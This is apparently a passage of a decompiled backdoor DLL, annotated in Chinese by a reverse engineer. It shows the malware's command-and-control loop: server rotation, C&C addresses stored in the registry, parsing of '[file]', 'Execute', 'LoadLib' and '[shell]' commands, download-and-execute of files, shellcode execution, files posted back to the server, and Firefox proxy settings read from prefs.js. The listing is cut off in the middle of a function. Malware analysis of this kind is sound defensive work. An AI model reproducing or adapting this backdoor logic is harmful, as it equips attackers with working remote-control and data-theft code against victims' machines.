            if ( bj_sub_100057B2_changeccserverintable((LPVOID *)v1) )// 接收命令失败,就更换CC服务器
              goto LABEL_30;
            v11 = bj_getnew_ccserver_sub_100052B7((LPVOID *)v1);// 返回为1,代表成功,后面不用睡
            *((_BYTE *)v1 + 0x21) = v11;
            if ( !v11 )
            {
              v3(0x1B7740u);                    // 半小时
LABEL_30:
              v3(0x2710u);
            }
            v9 = lpMem;
          }
          while ( !*((_BYTE *)v1 + 0x22) );     // 命令数据接收是否成功,成功为1
                                                // 
          if ( *((_BYTE *)v1 + 0x21) )          // 更新CC服务器, 跟循环外面那个一模一样
          {
            bj_sub_10005B0A_updateccserverinfoinregistry(v1[2]);
            bj_reproduce_v1_3_sub_100056AD(v1);
          }
          bj_sub_10003F45_free(lpMem);
          if ( !v10 )
            goto LABEL_55;
          v12 = bj_sub_10003F04_alloc(0x18u);
          if ( v12 )
          {
            v13 = bj_sub_10006131_0a0d_to_0(v12, (int)v10, v44);// 命令数据中\r\n全部填为\x0
            lpMem = v13;
          }
          else
          {
            v13 = 0;
            lpMem = 0;
          }
          while ( 1 )                           // 这个循环解析命令并执行命令
          {
            if ( !bj_sub_10006238_parse_received_comandfile((LPVOID **)v13) )// 根据读到的数据进行配置
                                                // 返回1,代表成功读取配置了命令;否则意味着所有命令均已配置
                                                // 注意,这里是配置了命令,还没执行. 执行命令估计会在后面的函数中,判断标志位,然后执行
              goto LABEL_52;
            ipaddress = bj_sub_100061E0_newserverip(v13);
            v15 = ipaddress;
            if ( ipaddress )                    // 得到ip地址就直接break...
              break;
            v39 = bj_sub_10006663_readfile(v13);
            if ( v39 )                          // 读到文件数据
              goto LABEL_48;
            v16 = (_BYTE *)bj_sub_100061D3_ifrequestforfile(v13);// 就是*(DWORD*)(v13[0])
            if ( !v16 )                         // 这里应该是利用这个来判断是执行命令还是执行文件操作了..
            {
              v39 = bj_sub_1000671E(v13);
              if ( !v39 )
                continue;
LABEL_48:
              v23 = bj_sub_100030D1_strdecrypt((int)&l_10007367, 1);


              v24 = bj_sub_10005880_makehttpsoptionalfield(v1, (int)v23, v39);// l= 1 - errcode
                                                //        l= 0 - errcode
              bj_sub_10005BBE_postdatatoserver((int)v1, v24);
              bj_sub_10003F45_free(v24);
              bj_sub_10003F45_free(v23);
              bj_sub_10003F45_free(v39);
              v13 = lpMem;
              continue;
            }
            v17 = bj_sub_100030D1_strdecrypt((int)&f_10007366, 1);// 如果v16非零
            v36 = v17;
            v18 = bj_sub_10005880_makehttpsoptionalfield(v1, (int)v17, v16);
            nNumberOfBytesRead = 0;
            v37 = v18;
            if ( *((_BYTE *)v1 + 0x20) )        // 发送f=<*(DWORD*)(v13[0])>  这TM是在请求文件啊
                                                // 并接受数据
              v19 = bj_sub_100051C0_inject_getfilefromserver((int *)v1, (int)v18, &nNumberOfBytesRead);
            else
              v19 = bj_sub_100050FD_getfilefromserver(v1, (int)v18, (int)&nNumberOfBytesRead);
            v40 = v19;
            if ( v19 )
            {
              v20 = bj_sub_100064D9_saveandexecutefile((void **)v13, v19, nNumberOfBytesRead);
              v21 = bj_sub_100030D1_strdecrypt((int)&l_10007367, 1);
              v22 = bj_sub_10005880_makehttpsoptionalfield(v42, (int)v21, v20);
              bj_sub_10005BBE_postdatatoserver((int)v42, v22);
              bj_sub_10003F45_free(v22);
              bj_sub_10003F45_free(v21);
              bj_sub_10003F45_free(v20);
              bj_sub_10003F45_free(v40);
              v1 = v42;
              v13 = lpMem;
            }
            bj_sub_10003F45_free(v37);
            bj_sub_10003F45_free(v36);
          }
          bj_sub_10005B0A_updateccserverinfoinregistry(ipaddress);// 注册表 更新 cc ip了
          bj_sub_10003F45_free(*((LPVOID *)v1[3] + 1));
          v25 = lstrlenA(v15);
          *((_DWORD *)v1[3] + 1) = bj_sub_10003F3C_alloc(v25 + 1);
          v26 = lstrlenA(v15);
          bj_sub_10003271_cpy(*((_DWORD *)v1[3] + 1), v15, v26);// ip拷贝到v1[3][1]
          bj_sub_10003F45_free(v15);
          v27 = bj_sub_100030D1_strdecrypt((int)&bj_2_10007359, 1);// "2"
          v28 = bj_sub_10005880_makehttpsoptionalfield(v1, (int)v41, v27);// c=2
          bj_sub_10005BBE_postdatatoserver((int)v1, v28);
          bj_sub_10003F45_free(v28);
          bj_sub_10003F45_free(v27);
          bj_sub_10003F45_free((LPVOID)v1[2]);
          v29 = lstrlenA(*((LPCSTR *)v1[3] + 1));
          v1[2] = (LPCSTR)bj_sub_10003F3C_alloc(v29 + 1);
          v30 = lstrlenA(*((LPCSTR *)v1[3] + 1));
          bj_sub_10003271_cpy((int)v1[2], *((_BYTE **)v1[3] + 1), v30);// 前面接收到的ip地址拷贝到v1[2]
          v31 = bj_sub_100049AA_pcdatacollection(v1);
          bj_sub_10005BBE_postdatatoserver((int)v1, v31);// w=<addrofdatacollection>
          bj_sub_10003F45_free(v31);
LABEL_52:
          v32 = bj_sub_100030D1_strdecrypt((int)&bj_2_10007359, 1);
          v33 = bj_sub_10005880_makehttpsoptionalfield(v1, (int)v41, v32);// c=2
          bj_sub_10005BBE_postdatatoserver((int)v1, v33);
          bj_sub_10003F45_free(v33);
          bj_sub_10003F45_free(v32);
          v34 = lpMem;
          if ( lpMem )
          {
            bj_sub_10006160(lpMem);             // 用于清空v13
            bj_sub_10003F1B_free(v34);
          }
          bj_sub_10003F45_free(v38);
          v3 = Sleep;
LABEL_55:
          bj_sub_10003F45_free(v35);
          bj_sub_10003F45_free(v41);
          v3(0x1B7740u);
        }
      }
      if ( !bj_sub_100057B2_changeccserverintable((LPVOID *)v1) )// 这个返回为0,那么就break, 请求新的CC服务器地址
        break;
LABEL_11:
      Sleep(0x2710u);
    }
    v5 = bj_getnew_ccserver_sub_100052B7((LPVOID *)v1);// 如果成功接收到 新恶意域名,那么返回1
    *((_BYTE *)v1 + 0x21) = v5;
    if ( !v5 )
    {
      Sleep(1800000u);                          // 半小时
      goto LABEL_11;
    }
  }
}

//----- (10006131) --------------------------------------------------------
_DWORD *__thiscall bj_sub_10006131_0a0d_to_0(_DWORD *this, int a2, unsigned int a3)
{
  _DWORD *v3; // esi

  v3 = this;
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  this[3] = a2;
  this[4] = a3;
  this[5] = 0;
  bj_sub_100061AD(a2, a3);
  return v3;
}

//----- (10006160) --------------------------------------------------------
HANDLE __thiscall bj_sub_10006160(_DWORD *this)
{
  _DWORD *v1; // esi
  void *v2; // edi
  HANDLE result; // eax
  void *v4; // edi
  void *v5; // edi

  v1 = this;
  v2 = (void *)*this;
  if ( *this )
  {
    bj_sub_1000389D_free((LPVOID *)*this);
    result = bj_sub_10003F1B_free(v2);
  }
  v4 = (void *)v1[1];
  if ( v4 )
  {
    bj_sub_10003D76_setzero((_DWORD *)v1[1]);
    result = bj_sub_10003F1B_free(v4);
  }
  v5 = (void *)v1[2];
  if ( v5 )
  {
    bj_sub_10006D83_free((LPVOID *)v1[2]);
    result = bj_sub_10003F1B_free(v5);
  }
  v1[5] = 0;
  v1[4] = 0;
  return result;
}

//----- (100061AD) --------------------------------------------------------
// 把a1开始的a2个字节中
// 0xd,0xa全部赋值为0
// 返回值为长度. 没什么用
unsigned int __cdecl bj_sub_100061AD(int a1, unsigned int a2)
{
  unsigned int result; // eax
  char v3; // dl

  result = 0;
  if ( a2 )
  {
    do
    {
      v3 = *(_BYTE *)(result + a1);
      if ( v3 == 0xD || v3 == 0xA )
        *(_BYTE *)(result + a1) = 0;
      ++result;
    }
    while ( result < a2 );
  }
  return result;
}

//----- (100061D3) --------------------------------------------------------
int __thiscall bj_sub_100061D3_ifrequestforfile(_DWORD *this)
{
  int result; // eax

  result = 0;
  JUMPOUT(*this, 0, bj_sub_10003B7F);
  return result;
}

//----- (100061E0) --------------------------------------------------------
// 这里把this[1]那边的ip地址字符串拷贝到新的堆空间中,然后返回地址.
// 并且把this[1]=0; this[1][0]=0; free(this[1]);清理了干净.
CHAR *__thiscall bj_sub_100061E0_newserverip(_DWORD *this)
{
  _DWORD *v1; // edi
  CHAR *v2; // ebx
  void *v3; // ecx
  const CHAR *v4; // eax
  const CHAR *v5; // esi
  int v6; // eax
  void *v7; // esi

  v1 = this;
  v2 = 0;
  v3 = (void *)this[1];
  if ( v3 )
  {
    v4 = (const CHAR *)bj_sub_10003B7F(v3);
    v5 = v4;
    if ( v4 )
    {
      v6 = lstrlenA(v4);
      v2 = (CHAR *)bj_sub_10003F3C_alloc(v6 + 1);
      wsprintfA(v2, "%s", v5);
    }
    v7 = (void *)v1[1];
    if ( v7 )
    {
      bj_sub_10003D76_setzero((_DWORD *)v1[1]);
      bj_sub_10003F1B_free(v7);
    }
    v1[1] = 0;
  }
  return v2;
}

//----- (10006238) --------------------------------------------------------
char __thiscall bj_sub_10006238_parse_received_comandfile(LPVOID **this)
{
  LPVOID **v1; // esi
  CHAR *v2; // eax
  CHAR *v3; // ebx
  CHAR *v4; // eax
  LPVOID *v5; // ecx
  const CHAR *v6; // eax
  LPVOID *v7; // ebx
  _DWORD *v8; // eax
  LPVOID *v9; // eax
  LPVOID *v10; // ebx
  _DWORD *v11; // eax
  LPVOID *v12; // eax
  LPVOID *v13; // ebx
  _DWORD *v14; // eax
  LPVOID *v15; // eax
  unsigned int v16; // eax
  CHAR *lpString2; // [esp+Ch] [ebp-2Ch]
  CHAR *v19; // [esp+10h] [ebp-28h]
  CHAR *v20; // [esp+14h] [ebp-24h]
  CHAR *v21; // [esp+18h] [ebp-20h]
  CHAR *v22; // [esp+1Ch] [ebp-1Ch]
  CHAR *v23; // [esp+20h] [ebp-18h]
  CHAR *v24; // [esp+24h] [ebp-14h]
  CHAR *v25; // [esp+28h] [ebp-10h]
  const CHAR *v26; // [esp+2Ch] [ebp-Ch]
  CHAR *v27; // [esp+30h] [ebp-8h]
  char v28; // [esp+37h] [ebp-1h]

  v1 = this;
  v28 = 0;
  lpString2 = bj_sub_100030D1_strdecrypt((int)&bj_unk_100075DC, 6);// "[file]"
  v2 = bj_sub_100030D1_strdecrypt((int)&bj_unk_100075E4, 7);// "Execute"
  v3 = v2;
  v27 = v2;
  v19 = bj_sub_100030D1_strdecrypt((int)&bj_unk_100075EC, 6);// "Delete"
  v20 = bj_sub_100030D1_strdecrypt((int)&bj_unk_100075F4, 7);// "LoadLib"
  v21 = bj_sub_100030D1_strdecrypt((int)&bj_unk_100075FC, 8);// "ReadFile"
  v22 = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007604, 7);// "[/file]"
  v23 = bj_sub_100030D1_strdecrypt((int)&bj_unk_1000760C, 10);// "[settings]"
  v24 = bj_sub_100030D1_strdecrypt((int)&bj_unk_1000761C, 11);// "[/settings]"
  v25 = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007628, 7);// "[shell]"
  v4 = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007638, 8);// "[/shell]"
  v5 = v1[5];
  v26 = v4;
  if ( v5 < v1[4] )
  {
    while ( 1 )
    {
      v6 = (const CHAR *)v1[3];
      if ( *v6 )
        break;
      v1[3] = (LPVOID *)(v6 + 1);               // 跳过间隔的0
      v1[5] = (LPVOID *)((char *)v5 + 1);
LABEL_40:
      v5 = v1[5];
      if ( v5 >= v1[4] )
      {
LABEL_41:
        v4 = (CHAR *)v26;
        goto LABEL_42;
      }
    }                                           // 这个牛逼,相当于switch,而且容易让人看错.
    if ( !lstrcmpiA(v6, lpString2) )            // 比较奇怪,就申请了个空间heapaddr4,其他什么都没做.
    {                                           // 现在看不觉得奇怪了..
                                                // 可以算一个重置, 每次接收到这个就意味着要对新的文件进行操作了
      v7 = *v1;
      if ( *v1 )
      {
        bj_sub_1000389D_free(*v1);
        bj_sub_10003F1B_free(v7);
      }
      v8 = bj_sub_10003F04_alloc(0x14u);
      if ( v8 )
        v9 = (LPVOID *)bj_sub_1000388A_setzero(v8);
      else
        v9 = 0;
      *v1 = v9;
LABEL_35:
      v3 = v27;
      goto LABEL_39;
    }
    if ( !lstrcmpiA((LPCSTR)v1[3], v3) )
    {
      bj_sub_10003CDF(*v1);
      goto LABEL_39;
    }
    if ( !lstrcmpiA((LPCSTR)v1[3], v19) )
    {
      bj_sub_10003D7B(*v1);
      goto LABEL_39;
    }
    if ( !lstrcmpiA((LPCSTR)v1[3], v20) )
    {
      bj_sub_10003D02(*v1);
      goto LABEL_39;
    }
    if ( !lstrcmpiA((LPCSTR)v1[3], v21) )
    {
      bj_sub_10003D76(*v1);
      goto LABEL_39;
    }
    if ( !lstrcmpiA((LPCSTR)v1[3], v22) )       // return (v28=1);
      goto LABEL_45;
    if ( !lstrcmpiA((LPCSTR)v1[3], v23) )       // 分配4个字节的空间,heapaddr5
    {
      v10 = v1[1];
      if ( v10 )
      {
        bj_sub_10003D76_setzero(v1[1]);
        bj_sub_10003F1B_free(v10);
      }
      v11 = bj_sub_10003F04_alloc(4u);
      if ( v11 )
        v12 = (LPVOID *)bj_sub_10006D69_setzero(v11);
      else
        v12 = 0;
      v1[1] = v12;
      goto LABEL_35;
    }
    if ( !lstrcmpiA((LPCSTR)v1[3], v24) )       // return (v28=1)
      goto LABEL_45;
    if ( !lstrcmpiA((LPCSTR)v1[3], v25) )       // 分配4个字节的空间,heapaddr6
    {
      v13 = v1[2];
      if ( v13 )
      {
        bj_sub_10006D83_free(v1[2]);
        bj_sub_10003F1B_free(v13);
      }
      v14 = bj_sub_10003F04_alloc(4u);
      if ( v14 )
        v15 = (LPVOID *)bj_sub_10006D69_setzero(v14);
      else
        v15 = 0;
      v1[2] = v15;
      goto LABEL_35;
    }
    if ( lstrcmpiA((LPCSTR)v1[3], v26) )        // 注意,注意,注意, 这里是不相等
      bj_sub_1000653B((LPCSTR **)v1, (LPCSTR)v1[3]);
    else
LABEL_45:
      v28 = 1;                                  // 就是有 "/"的,都会return (v28 = 1)
LABEL_39:
    v16 = bj_sub_10002D28_strlen((int)v1[3]);
    v1[5] = (LPVOID *)((char *)v1[5] + v16);    // 注意,因为v1是LPVOID**,所以这里的操作会影响到v1本身的数据
    v1[3] = (LPVOID *)((char *)v1[3] + v16);
    if ( v28 )
      goto LABEL_41;
    goto LABEL_40;
  }
LABEL_42:
  bj_sub_10003F45_free(v4);
  bj_sub_10003F45_free(v25);
  bj_sub_10003F45_free(v24);
  bj_sub_10003F45_free(v23);
  bj_sub_10003F45_free(v22);
  bj_sub_10003F45_free(v21);
  bj_sub_10003F45_free(v20);
  bj_sub_10003F45_free(v19);
  bj_sub_10003F45_free(v3);
  bj_sub_10003F45_free(lpString2);
  return v28;
}

//----- (100064D9) --------------------------------------------------------
CHAR *__thiscall bj_sub_100064D9_saveandexecutefile(void **this, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  void **v3; // edi
  CHAR *v4; // ebx
  LPCWSTR *v5; // ecx
  DWORD v6; // esi
  int v7; // eax
  void *v8; // esi

  v3 = this;
  v4 = 0;
  v5 = (LPCWSTR *)*this;
  if ( v5 )
  {
    v6 = bj_sub_1000390E(v5, lpBuffer, nNumberOfBytesToWrite);
    v4 = (CHAR *)bj_sub_10003F3C_alloc(0x401u);
    v7 = bj_sub_10003B7F(*v3);                  // 就是*heapaddr4
                                                // 看来这个上面也是个字符串地址, 跟文件的错误码有关的.
    wsprintfA(v4, "%s - %lu", v7, v6);
    v8 = *v3;
    if ( *v3 )
    {
      bj_sub_1000389D_free((LPVOID *)*v3);
      bj_sub_10003F1B_free(v8);
    }
    *v3 = 0;
  }
  return v4;
}

//----- (1000653B) --------------------------------------------------------
_BYTE *__thiscall bj_sub_1000653B(LPCSTR **this, LPCSTR lpString1)
{
  const CHAR *v2; // edi
  LPCSTR **v3; // ebx
  _BYTE *result; // eax
  const CHAR *v5; // esi
  int v6; // eax
  CHAR *lpString2; // [esp+Ch] [ebp-10h]
  CHAR *v8; // [esp+10h] [ebp-Ch]
  CHAR *v9; // [esp+14h] [ebp-8h]
  CHAR *v10; // [esp+18h] [ebp-4h]
  CHAR *lpString1a; // [esp+24h] [ebp+8h]

  v2 = lpString1;                               // 应该是这种格式"xxxx=yyyy"
  v3 = this;
  result = bj_sub_100032C4_strfind(lpString1, 0x3D);// '='
  if ( result )
  {
    *result = 0;
    v5 = result + 1;
    lpString2 = bj_sub_100030D1_strdecrypt((int)&bj_unk_100075C0, 8);// "FileName"
    v8 = bj_sub_100030D1_strdecrypt((int)&bj_unk_100075C8, 10);// "PathToSave"
    v9 = bj_sub_100030D1_strdecrypt((int)&bj_unk_100075D4, 6);// "Rundll"
    v10 = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007618, 2);// "IP"
    lpString1a = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007630, 5);// "shell"
    if ( lstrcmpiA(v2, lpString2) )
    {
      if ( lstrcmpiA(v2, v8) )
      {
        if ( lstrcmpiA(v2, v9) )
        {
          if ( lstrcmpiA(v2, v10) )
          {
            if ( !lstrcmpiA(v2, lpString1a) )
            {
              v6 = lstrlenA(v5);
              bj_sub_10006D98(v3[2], v5, v6);   // shell
            }
          }
          else
          {
            bj_sub_10006D73(v3[1], (int)v5);    // ip
          }
        }
        else
        {
          bj_sub_10003D07(*v3, v5);             // rundll
        }
      }
      else
      {
        bj_sub_10003D1E(*v3, v5);               // pathtosave
      }
    }
    else
    {
      bj_sub_10003CE4(*v3, v5);                 // filename
    }
    bj_sub_10003F45_free(lpString1a);
    bj_sub_10003F45_free(v10);
    bj_sub_10003F45_free(v9);
    bj_sub_10003F45_free(v8);
    result = bj_sub_10003F45_free(lpString2);
  }
  return result;
}

//----- (10006663) --------------------------------------------------------
CHAR *__thiscall bj_sub_10006663_readfile(_DWORD *this)
{
  void **v1; // ebx
  CHAR *v2; // esi
  _BYTE *v3; // ecx
  CHAR *v4; // edi
  const CHAR *v5; // eax
  int v6; // esi
  int v7; // esi
  int v8; // eax
  CHAR *v9; // eax
  int v10; // ST0C_4
  void *v11; // ecx
  int v12; // eax
  int v13; // ebx
  int v14; // eax
  CHAR v16[4]; // [esp+8h] [ebp-10h]
  int lasterror; // [esp+14h] [ebp-4h]

  v1 = (void **)this;
  v2 = 0;
  v3 = (_BYTE *)*this;
  if ( v3 )
  {
    lasterror = 0;
    v4 = bj_sub_10003B82_readtargetfile(v3, (DWORD *)&lasterror);
    if ( v4 || lasterror )
    {
      v5 = (const CHAR *)bj_sub_10003B7F(*v1);
      v6 = lstrlenA(v5);
      v7 = lstrlenA(v4) + v6;
      v8 = lstrlenA(" - ");
      v9 = (CHAR *)bj_sub_10003F3C_alloc(v7 + 11 + v8);
      v10 = lasterror;
      v11 = *v1;
      v2 = v9;
      strcpy(v16, "%s - %lu\t");
      v12 = bj_sub_10003B7F(v11);
      v13 = wsprintfA(v2, v16, v12, v10);
      if ( v4 )
      {
        v14 = lstrlenA(v4);
        bj_sub_10003271_cpy((int)&v2[v13], v4, v14);// %s - %lu\t<base64(filedata)>
        bj_sub_10003F45_free(v4);
      }
    }
  }
  return v2;
}

//----- (1000671E) --------------------------------------------------------
CHAR *__thiscall bj_sub_1000671E(_DWORD *this)
{
  _DWORD *v1; // edi
  CHAR *v2; // ebx
  LPTHREAD_START_ROUTINE *v3; // ecx
  unsigned __int8 v4; // bl
  CHAR *v5; // ST2C_4
  const CHAR *v6; // eax
  int v7; // ecx
  CHAR *v8; // esi
  void *v9; // esi
  int v11; // [esp+Ch] [ebp-4h]

  v1 = this;
  v2 = 0;
  v3 = (LPTHREAD_START_ROUTINE *)this[2];       // 原来前面拷贝的shell是shellcode
  if ( v3 )
  {
    v11 = 0;
    v4 = bj_sub_10006DFB(v3, (DWORD *)&v11);    // 执行为1,没执行为0
    v5 = (CHAR *)bj_sub_10003F3C_alloc(0x401u);
    v6 = bj_sub_100030D1_strdecrypt((int)&bj_unk_10007640, 8);// "%d - %lu"
    v7 = v4;
    v8 = (CHAR *)v6;
    v2 = v5;
    wsprintfA(v5, v6, v7, v11);
    bj_sub_10003F45_free(v8);
    v9 = (void *)v1[2];                         // 又做了清理工作,都是一次性的
    if ( v9 )
    {
      bj_sub_10006D83_free((LPVOID *)v1[2]);
      bj_sub_10003F1B_free(v9);
    }
    v1[2] = 0;
  }
  return v2;
}

//----- (10006797) --------------------------------------------------------
_DWORD *__thiscall bj_sub_10006797(_DWORD *this)
{
  *this = &bj_off_1000765C;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
  return this;
}
// 1000765C: using guessed type int (__thiscall *bj_off_1000765C)(LPVOID lpMem, char);

//----- (100067AB) --------------------------------------------------------
void *__thiscall bj_sub_100067AB_free(LPVOID *this)
{
  *this = &bj_off_1000765C;
  return bj_sub_100067EC_free(this);
}
// 1000765C: using guessed type int (__thiscall *bj_off_1000765C)(LPVOID lpMem, char);

//----- (100067B6) --------------------------------------------------------
void *__thiscall bj_sub_100067B6(LPVOID lpMem, char a2)
{
  void *v2; // esi

  v2 = lpMem;
  *(_DWORD *)lpMem = &bj_off_1000765C;
  bj_sub_100067EC_free((LPVOID *)lpMem);
  if ( a2 & 1 )
  {
    if ( a2 & 4 )
      ret_nullsub_1(v2, 16);
    else
      bj_sub_10003F1B_free(v2);
  }
  return v2;
}
// 100022E6: using guessed type int __cdecl ret_nullsub_1(_DWORD, _DWORD);
// 1000765C: using guessed type int (__thiscall *bj_off_1000765C)(LPVOID lpMem, char);

//----- (100067EC) --------------------------------------------------------
void *__thiscall bj_sub_100067EC_free(LPVOID *this)
{
  LPVOID *v1; // esi

  v1 = this;
  bj_sub_10006819_free(this, 0);
  bj_sub_10006839_free(v1, 0);
  return bj_sub_10006859_free(v1, 0);
}

//----- (1000680E) --------------------------------------------------------
char sub_1000680E()
{
  return 0;
}

//----- (10006819) --------------------------------------------------------
void *__thiscall bj_sub_10006819_free(LPVOID *this, void *a2)
{
  LPVOID *v2; // esi
  void *result; // eax

  v2 = this;
  if ( this[1] )
    bj_sub_10003F45_free(this[1]);
  result = a2;
  v2[1] = a2;
  return result;
}

//----- (10006839) --------------------------------------------------------
void *__thiscall bj_sub_10006839_free(LPVOID *this, void *a2)
{
  LPVOID *v2; // esi
  void *result; // eax

  v2 = this;
  if ( this[3] )
    bj_sub_10003F45_free(this[3]);
  result = a2;
  v2[3] = a2;
  return result;
}

//----- (10006859) --------------------------------------------------------
void *__thiscall bj_sub_10006859_free(LPVOID *this, void *a2)
{
  LPVOID *v2; // esi
  void *result; // eax

  v2 = this;
  if ( this[2] )
    bj_sub_10003F45_free(this[2]);
  result = a2;
  v2[2] = a2;
  return result;
}

//----- (10006879) --------------------------------------------------------
_DWORD *__thiscall bj_sub_10006879(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this;
  bj_sub_10006797(this);                        // 重复赋值了，后面的把前面的覆盖了。。
  *v1 = &bj_off_100076A4;
  return v1;
}
// 100076A4: using guessed type int (__thiscall *bj_off_100076A4)(LPVOID lpMem, char);

//----- (1000688B) --------------------------------------------------------
void *__thiscall bj_sub_1000688B(LPVOID lpMem, char a2)
{
  void *v2; // esi

  v2 = lpMem;
  *(_DWORD *)lpMem = &bj_off_100076A4;
  bj_sub_100067AB_free((LPVOID *)lpMem);
  if ( a2 & 1 )
  {
    if ( a2 & 4 )
      ret_nullsub_1(v2, 0x10);
    else
      bj_sub_10003F1B_free(v2);
  }
  return v2;
}
// 100022E6: using guessed type int __cdecl ret_nullsub_1(_DWORD, _DWORD);
// 100076A4: using guessed type int (__thiscall *bj_off_100076A4)(LPVOID lpMem, char);

//----- (100068C1) --------------------------------------------------------
// arg1: heapaddr2_1
char __thiscall bj_sub_100068C1_getproxyinfofromfirefoxini(LPVOID *this)
{
  LPVOID *v1; // edi
  char v2; // bl
  char *v3; // eax
  CHAR *v4; // esi
  char *lpMem; // [esp+8h] [ebp-4h]

  v1 = this;
  v2 = 0;
  v3 = (char *)bj_sub_10006907_readfirefox_prefsjs();
  lpMem = v3;
  if ( v3 )
  {
    v4 = bj_sub_10006C2F(v3);
    bj_sub_10003F45_free(lpMem);
    v2 = 0;
    if ( v4 )
      v2 = 1;
    bj_sub_10006819_free(v1, v4);
  }
  return v2;
}

//----- (10006907) --------------------------------------------------------
// 找到%APPDATA%\Mozilla\Firefox\%s\prefs.js, 读取内容并返回
// %s是%APPDATA%\Mozilla\Firefox\profiles.ini里面Profile0段Path的值.
// 特意安装了一下,类似"1sxicxn5.default",应该是个随机生成值
void *bj_sub_10006907_readfirefox_prefsjs()
{
  WCHAR *v0; // eax
  WCHAR *v1; // ebx
  WCHAR *v2; // esi
  WCHAR *v3; // edi
  _WORD *v4; // eax
  void *v5; // edi
  HANDLE v6; // eax
  void *v7; // ebx
  DWORD v8; // esi
  WCHAR *lpMem; // [esp+Ch] [ebp-B0h]
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-ACh]
  WCHAR v12; // [esp+14h] [ebp-A8h]
  __int16 v13; // [esp+16h] [ebp-A6h]
  __int16 v14; // [esp+18h] [ebp-A4h]
  __int16 v15; // [esp+1Ah] [ebp-A2h]
  __int16 v16; // [esp+1Ch] [ebp-A0h]
  __int16 v17; // [esp+1Eh] [ebp-9Eh]
  __int16 v18; // [esp+20h] [ebp-9Ch]
  __int16 v19; // [esp+22h] [ebp-9Ah]
  __int16 v20; // [esp+24h] [ebp-98h]
  __int16 v21; // [esp+26h] [ebp-96h]
  __int16 v22; // [esp+28h] [ebp-94h]
  __int16 v23; // [esp+2Ah] [ebp-92h]
  __int16 v24; // [esp+2Ch] [ebp-90h]
  __int16 v25; // [esp+2Eh] [ebp-8Eh]
  __int16 v26; // [esp+30h] [ebp-8Ch]
  __int16 v27; // [esp+34h] [ebp-88h]
  __int16 v28; // [esp+36h] [ebp-86h]
  __int16 v29; // [esp+38h] [ebp-84h]
  __int16 v30; // [esp+3Ah] [ebp-82h]
  __int16 v31; // [esp+3Ch] [ebp-80h]
  __int16 v32; // [esp+3Eh] [ebp-7Eh]
  __int16 v33; // [esp+40h] [ebp-7Ch]
  __int16 v34; // [esp+42h] [ebp-7Ah]
  __int16 v35; // [esp+44h] [ebp-78h]
  __int16 v36; // [esp+46h] [ebp-76h]
  __int16 v37; // [esp+48h] [ebp-74h]
  __int16 v38; // [esp+4Ah] [ebp-72h]
  __int16 v39; // [esp+4Ch] [ebp-70h]
  WCHAR v40; // [esp+50h] [ebp-6Ch]
  __int16 v41; // [esp+52h] [ebp-6Ah]
  __int16 v42; // [esp+54h] [ebp-68h]
  __int16 v43; // [esp+56h] [ebp-66h]
  __int16 v44; // [esp+58h] [ebp-64h]
  __int16 v45; // [esp+5Ah] [ebp-62h]
  __int16 v46; // [esp+5Ch] [ebp-60h]
  __int16 v47; // [esp+5Eh] [ebp-5Eh]
  __int16 v48; // [esp+60h] [ebp-5Ch]
  __int16 v49; // [esp+62h] [ebp-5Ah]
  __int16 v50; // [esp+64h] [ebp-58h]
  __int16 v51; // [esp+66h] [ebp-56h]
  __int16 v52; // [esp+68h] [ebp-54h]
  __int16 v53; // [esp+6Ah] [ebp-52h]
  __int16 v54; // [esp+6Ch] [ebp-50h]
  __int16 v55; // [esp+6Eh] [ebp-4Eh]
  __int16 v56; // [esp+70h] [ebp-4Ch]
  __int16 v57; // [esp+72h] [ebp-4Ah]
  __int16 v58; // [esp+74h] [ebp-48h]
  __int16 v59; // [esp+76h] [ebp-46h]
  __int16 v60; // [esp+78h] [ebp-44h]
  WCHAR AppName; // [esp+7Ch] [ebp-40h]
  __int16 v62; // [esp+7Eh] [ebp-3Eh]
  __int16 v63; // [esp+80h] [ebp-3Ch]
  __int16 v64; // [esp+82h] [ebp-3Ah]
  __int16 v65; // [esp+84h] [ebp-38h]
  __int16 v66; // [esp+86h] [ebp-36h]
  __int16 v67; // [esp+88h] [ebp-34h]
  __int16 v68; // [esp+8Ah] [ebp-32h]
  __int16 v69; // [esp+8Ch] [ebp-30h]
  WCHAR KeyName; // [esp+90h] [ebp-2Ch]
  __int16 v71; // [esp+92h] [ebp-2Ah]
  __int16 v72; // [esp+94h] [ebp-28h]
  __int16 v73; // [esp+96h] [ebp-26h]
  __int16 v74; // [esp+98h] [ebp-24h]
  __int16 v75; // [esp+9Ch] [ebp-20h]
  __int16 v76; // [esp+9Eh] [ebp-1Eh]
  __int16 v77; // [esp+A0h] [ebp-1Ch]
  __int16 v78; // [esp+A2h] [ebp-1Ah]
  __int16 v79; // [esp+A4h] [ebp-18h]
  __int16 v80; // [esp+A6h] [ebp-16h]
  __int16 v81; // [esp+A8h] [ebp-14h]
  __int16 v82; // [esp+AAh] [ebp-12h]
  __int16 v83; // [esp+ACh] [ebp-10h]
  __int16 v84; // [esp+AEh] [ebp-Eh]
  __int16 v85; // [esp+B0h] [ebp-Ch]
  __int16 v86; // [esp+B2h] [ebp-Ah]
  __int16 v87; // [esp+B4h] [ebp-8h]
  __int16 v88; // [esp+B6h] [ebp-6h]
  __int16 v89; // [esp+B8h] [ebp-4h]
  __int16 v90; // [esp+BAh] [ebp-2h]

  v0 = (WCHAR *)bj_sub_10003F3C_alloc(0x208u);
  v1 = v0;
  lpMem = v0;
  SHGetSpecialFolderPathW(0, v0, 0x1A, 0);      // CSIDL_APPDATA
  v2 = (WCHAR *)bj_sub_10003F3C_alloc(0x208u);
  v75 = 0x4D;
  v77 = 0x7A;
  v81 = 0x61;
  v82 = 0;
  v83 = 0x46;
  v85 = 0x72;
  v86 = 0x65;
  v87 = 0x66;
  v89 = 0x78;
  v90 = 0;
  v27 = 0x70;
  v28 = 0x72;
  v30 = 0x66;
  v76 = 0x6F;
  v88 = 0x6F;
  v29 = 0x6F;
  v33 = 0x65;
  v35 = 0x2E;
  v78 = 0x69;
  v79 = 0x6C;
  v80 = 0x6C;
  v84 = 0x69;
  v31 = 0x69;
  v32 = 0x6C;
  v34 = 0x73;
